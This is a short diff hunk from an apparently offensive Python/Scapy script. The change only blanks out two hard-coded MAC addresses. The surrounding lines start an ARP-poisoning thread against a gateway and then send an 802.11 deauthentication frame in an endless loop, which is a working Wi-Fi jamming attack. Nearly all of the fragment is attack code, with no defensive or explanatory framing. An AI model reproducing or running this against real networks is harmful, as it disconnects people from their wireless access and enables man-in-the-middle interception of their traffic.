@@ -62,8 +62,8 @@ poison_thread = threading.Thread(target = poison_target, args =(gateway_ip, gate
 poison_thread.start()
 
 '''
-c="F8:94:C2:0F:C2:60"	
-bssid="F8:94:C2:0F:C1:A2"
+c=""	
+bssid=""
 pkt = RadioTap() / Dot11(addr1=bssid, addr2="78:11:DC:35:23:5F", addr3=bssid,type=2, subtype=4) / Dot11Deauth(reason=2)
 while True:
 	sendp(pkt, iface=interface, verbose=False)
